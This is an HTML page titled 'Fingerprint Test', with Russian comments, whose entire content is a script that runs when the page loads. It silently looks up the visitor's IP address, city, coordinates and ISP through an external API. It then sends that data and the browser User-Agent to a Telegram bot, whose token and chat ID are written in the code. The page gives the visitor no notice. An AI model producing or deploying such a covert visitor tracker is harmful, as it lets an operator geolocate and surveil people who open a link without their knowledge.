<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Fingerprint Test</title>
</head>
<body>

<script>
// Получаем IP клиента через внешний API (например, ipwhois.io)
fetch('https://free.ipwhois.io/json/')
  .then(response => response.json())
  .then(apiData => {
    // Извлекаем информацию о клиенте из ответа API
    const ip = apiData.ip;
    const country = apiData.country;
    const region = apiData.region;
    const city = apiData.city;
    const latitude = apiData.latitude;
    const longitude = apiData.longitude;
    const isp = apiData.isp;

    // Получаем User-Agent браузера
    const ua = navigator.userAgent;

    // Формируем сообщение, которое нужно отправить в Telegram
    const message = encodeURIComponent(
      `${ip}\n${country} ${region}\n${city}\n${latitude}\n${longitude}\n${isp}\n\n${ua}`
    );

    // Настроим параметры для отправки через Telegram Bot API
    const botToken = '1682820271:AAE3HGqITz6N5qyIcy3ODm6rOIypbBseAJ4';
    const chatId = '669186959';
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&parse_mode=html&text=${message}`;

    // Отправляем сообщение в Telegram
    fetch(telegramUrl)
      .then(response => response.json())
      .then(data => {
        console.log('Message sent successfully:', data);
      })
      .catch(error => {
        console.error('Error sending message:', error);
      });
  })
  .catch(error => {
    console.error('Error fetching IP details:', error);
  });

</script>

</body>
</html>
